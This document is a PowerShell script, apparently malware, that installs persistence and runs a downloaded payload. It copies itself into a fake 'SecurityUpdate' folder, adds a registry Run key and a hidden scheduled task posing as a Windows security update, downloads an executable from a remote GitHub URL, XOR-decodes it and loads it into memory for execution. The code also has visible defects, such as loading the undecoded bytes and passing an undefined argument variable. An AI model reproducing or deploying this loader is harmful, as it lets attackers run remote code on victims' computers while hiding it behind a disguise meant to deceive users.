# Configuration
$Url= "https://github.com/khpccbr/open/raw/refs/heads/main/part2a.exe"
$folderPath = "C:\ProgramData\SecurityUpdate"
$scriptCopyName = "secupdate.ps1"
$payloadName = "secupdate.bin"
$scriptCopyPath = Join-Path -Path $folderPath -ChildPath $scriptCopyName
$payloadPath = Join-Path -Path $folderPath -ChildPath $payloadName
$taskName = "SecurityUpdateTask"
$registryName = "SecurityUpdateService"
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Get current script path
$currentScriptPath = $PSCommandPath
if (-not $currentScriptPath) {
    Write-Error "Script must be run from a file, not from console"
    exit 1
}

try {
    # Step 1: Create directory
    Write-Host "[*] Creating target directory..." -ForegroundColor Cyan
    if (-not (Test-Path -Path $folderPath)) {
        New-Item -ItemType Directory -Path $folderPath -Force | Out-Null
        Write-Host "[+] Directory created: $folderPath" -ForegroundColor Green
    } else {
        Write-Host "[*] Directory already exists: $folderPath" -ForegroundColor Yellow
    }
    
    # Step 2: Copy this script to the target directory
    Write-Host "`n[*] Copying script to target directory..." -ForegroundColor Cyan
    Write-Host "    Source: $currentScriptPath" -ForegroundColor Gray
    Write-Host "    Destination: $scriptCopyPath" -ForegroundColor Gray
    
    try {
        Copy-Item -Path $currentScriptPath -Destination $scriptCopyPath -Force
        Write-Host "[+] Script copied successfully" -ForegroundColor Green
    } catch {
        Write-Error "Failed to copy script: $_"
        exit 1
    }
    
    # Step 3: Check if persistence already exists
    Write-Host "`n[*] Checking for existing persistence..." -ForegroundColor Cyan
    
    $taskExists = $null -ne (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)
    $regExists = $null -ne (Get-ItemProperty -Path $registryPath -Name $registryName -ErrorAction SilentlyContinue)
    
    if ($taskExists -and $regExists) {
        Write-Host "[*] Persistence mechanisms already exist, skipping..." -ForegroundColor Yellow
    } else {
        Write-Host "[*] Creating persistence mechanisms..." -ForegroundColor Cyan
        
        # Build command to execute the COPIED script with URL parameter
        $executeCommand = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptCopyPath`" -Url `"$Url`""
        
        # Create registry Run key
        Write-Host "`n[*] Creating registry persistence..." -ForegroundColor Cyan
        try {
            Set-ItemProperty -Path $registryPath -Name $registryName -Value $executeCommand -Force
            Write-Host "[+] Registry key created" -ForegroundColor Green
            Write-Host "    Path: $registryPath" -ForegroundColor Gray
            Write-Host "    Name: $registryName" -ForegroundColor Gray
            Write-Host "    Command: $executeCommand" -ForegroundColor Gray
        } catch {
            Write-Warning "Failed to create registry key: $_"
        }
        
        # Create scheduled task
        Write-Host "`n[*] Creating scheduled task..." -ForegroundColor Cyan
        try {
            # Define action - execute the COPIED script
            $action = New-ScheduledTaskAction -Execute "powershell.exe" `
                -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptCopyPath`" -Url `"$Url`""
            
            # Define triggers
            $triggerDaily = New-ScheduledTaskTrigger -Daily -At 9am
            $triggerLogon = New-ScheduledTaskTrigger -AtLogOn
            
            # Define settings
            $settings = New-ScheduledTaskSettingsSet `
                -AllowStartIfOnBatteries `
                -DontStopIfGoingOnBatteries `
                -StartWhenAvailable `
                -Hidden `
                -ExecutionTimeLimit (New-TimeSpan -Hours 1)
            
            # Define principal (run as current user)
            $principal = New-ScheduledTaskPrincipal `
                -UserId "$env:USERDOMAIN\$env:USERNAME" `
                -LogonType Interactive `
                -RunLevel Limited
            
            # Register the task
            Register-ScheduledTask `
                -TaskName $taskName `
                -Action $action `
                -Trigger $triggerDaily,$triggerLogon `
                -Settings $settings `
                -Principal $principal `
                -Description "Windows Security Update Service" `
                -Force | Out-Null
            
            Write-Host "[+] Scheduled task created" -ForegroundColor Green
            Write-Host "    Name: $taskName" -ForegroundColor Gray
            Write-Host "    Triggers: Daily at 9 AM + At user logon" -ForegroundColor Gray
            Write-Host "    Script: $scriptCopyPath" -ForegroundColor Gray
            
        } catch {
            Write-Warning "Failed to create scheduled task: $_"
        }
    }
    
    # Step 4: Download payload
    Write-Host "`n[*] Downloading payload..." -ForegroundColor Cyan
    Write-Host "    URL: $Url" -ForegroundColor Gray
    Write-Host "    Destination: $payloadPath" -ForegroundColor Gray
    
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($Url, $payloadPath)
        $webClient.Dispose()
        
        Write-Host "[+] Download completed successfully" -ForegroundColor Green
        
        # Verify and display file info
        if (Test-Path $payloadPath) {
            $fileInfo = Get-Item $payloadPath
            Write-Host "    File size: $($fileInfo.Length) bytes" -ForegroundColor Gray
            Write-Host "    Modified: $($fileInfo.LastWriteTime)" -ForegroundColor Gray
        }
        
    } catch {
        Write-Error "Download failed: $_"
        exit 1
    }

    $key = 0x25

    # Read file
    $fileBytes = [System.IO.File]::ReadAllBytes($payloadPath)

    # XOR each byte
    $xorBytes = New-Object byte[] $fileBytes.Length
    for ($i = 0; $i -lt $fileBytes.Length; $i++) {
        $xorBytes[$i] = $fileBytes[$i] -bxor ($key -band 0xFF)
    }

 try {
        Write-Host "[*] Loading assembly from memory..." -ForegroundColor Cyan
        
        # Load assembly into current AppDomain
        $assembly = [System.Reflection.Assembly]::Load($fileBytes)
        
        Write-Host "[+] Assembly loaded: $($assembly.FullName)" -ForegroundColor Green
        
        # Get entry point
        $entryPoint = $assembly.EntryPoint
        
        if ($entryPoint -eq $null) {
            throw "No entry point found in assembly"
        }
        
        Write-Host "[*] Entry point: $($entryPoint.Name)" -ForegroundColor Cyan
        $parameters = $entryPoint.GetParameters()
        Write-Host "[*] Parameter count: $($parameters.Length)" -ForegroundColor Gray

        # Invoke entry point
        Write-Host "[*] Executing..." -ForegroundColor Cyan
        
        # Invoke based on signature
        if ($parameters.Length -eq 0) {
            # Main() with no parameters
            Write-Host "[*] Invoking with no parameters..." -ForegroundColor Cyan
            $result = $entryPoint.Invoke($null, $null)
        }
        else {
            # Main(string[] args)
            Write-Host "[*] Invoking with arguments array..." -ForegroundColor Cyan
            
            # CRITICAL: Wrap the string array in an object array
            $invokeParams = @(,$Arguments)
            $result = $entryPoint.Invoke($null, $invokeParams)
        }
        
        Write-Host "[+] Execution complete" -ForegroundColor Green
    }
    catch {
        Write-Error "Failed to execute assembly: $_"
    }   
    
    # Summary
    Write-Host "`n================================" -ForegroundColor Yellow
    Write-Host "Installation Complete" -ForegroundColor Green
    Write-Host "================================" -ForegroundColor Yellow
    Write-Host "Script Copy: $scriptCopyPath" -ForegroundColor Cyan
    Write-Host "Payload: $payloadPath" -ForegroundColor Cyan
    Write-Host "`nPersistence Mechanisms:" -ForegroundColor Cyan
    Write-Host "  Registry: $registryPath\$registryName" -ForegroundColor Gray
    Write-Host "  Task: $taskName" -ForegroundColor Gray
    Write-Host "  Both execute: $scriptCopyPath" -ForegroundColor Gray
    Write-Host "================================`n" -ForegroundColor Yellow
    
} catch {
    Write-Error "Critical error occurred: $_"
    exit 1
}